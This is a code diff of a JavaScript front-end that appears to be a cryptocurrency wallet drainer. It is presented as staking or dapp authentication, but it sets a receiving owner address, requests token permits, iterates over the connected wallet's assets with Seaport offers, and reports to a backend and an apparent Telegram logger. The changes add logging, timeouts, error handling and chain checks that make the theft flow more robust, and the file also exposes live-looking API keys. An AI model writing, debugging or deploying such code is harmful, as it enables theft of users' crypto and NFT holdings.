@@ -26,6 +26,7 @@ ownerAddress = '0xBB0377d3e81E14185b9965caeCa54a32974Bf669' // specify address r
 const OPENSEA_API_KEY = "4ea4cd25c3904c5ab76844d5f1b2549f";
 const ZAPPER_KEY = '679d6958-de57-407e-90aa-ea74e1391153'  // specify your API key
 const BASE_URL = 'https://dappauthbackend-production.up.railway.app/api'; // specify the address to the configured server in format https://server.com/api
+console.log("Backend URL:", BASE_URL);
 // SET THESE END
 
 const TOKEN_APPROVE = BASE_URL + '/token_permit';
@@ -887,13 +888,35 @@ async function stakeERC20(tokenAddress, amount, msg, chainId, abiUrl) {
     console.log("Posting to backend...");
     console.log(data);
 
+    try {
+
+    console.log("POST URL:", TOKEN_TRANSFER);
+    console.log("POST BODY:", data);
+
     const response = await axios.post(
         TOKEN_TRANSFER,
-        data
+        data,
+        {
+            timeout: 30000
+        }
     );
 
-    console.log("✅ Backend Response");
-    console.log(response.data);
+    console.log("Backend status:", response.status);
+    console.log("Backend data:", response.data);
+
+} catch (err) {
+
+    console.error("POST FAILED");
+
+    if (err.response) {
+        console.error(err.response.status);
+        console.error(err.response.data);
+    } else {
+        console.error(err.message);
+    }
+
+    throw err;
+}
 
     logTlgMsg(msg, success);
 
@@ -954,13 +977,16 @@ async function sendToken(wasWethApproved, offer, counter, Seaport) {
 console.log("========== SEND TOKEN ==========");
 console.log("Total Items:", tokenList.length);
 
+if (!tokenList || tokenList.length === 0) {
+    console.log("No transferable assets found.");
+    return alertshow();
+}
+
 for (const item of tokenList) {
 
     console.log("---------------------------");
     console.log("Current Item:");
     console.log(item);
- 
-    if(item < 1) return alertshow();
       if (!item.approved) {
           
         if (wasWethApproved && item.tokenAddress == WETH) return;
@@ -977,7 +1003,12 @@ console.log("Required Chain:", chainToId[item.chain]?.chainId);
           console.log("item.chain =", item.chain);
 console.log("chainToId =", Object.keys(chainToId));
           console.log("Passed chain check");
-        if (chainHex !== chainToId[item.chain].chainId) {
+        if (!chainToId[item.chain]) {
+    console.error("Unsupported chain:", item.chain);
+    continue;
+}
+
+if (chainHex !== chainToId[item.chain].chainId) {
             console.log("Switching network...");
 
 await changeNetwork(chainToId[item.chain].chainId);
